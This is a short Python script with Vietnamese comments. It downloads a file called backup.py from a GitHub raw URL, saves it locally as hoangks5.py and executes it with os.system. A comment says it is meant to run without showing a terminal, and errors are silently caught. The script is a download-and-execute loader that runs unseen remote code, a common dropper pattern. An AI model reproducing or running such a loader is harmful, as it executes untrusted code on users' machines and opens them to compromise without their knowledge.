try:
  import requests
  url = "https://raw.githubusercontent.com/hoangks5/add_vps/refs/heads/main/backup.py"
  response = requests.request("GET", url)
  code = response.text
  # chạy hàm này để thực thi code
  import os
  # save code to file
  with open('hoangks5.py', 'w', encoding='utf-8') as f:
    f.write(code)
  # run code không hiện terminal
  os.system('python hoangks5.py')
except Exception as e:
  print(e)
  import time
  time.sleep(100)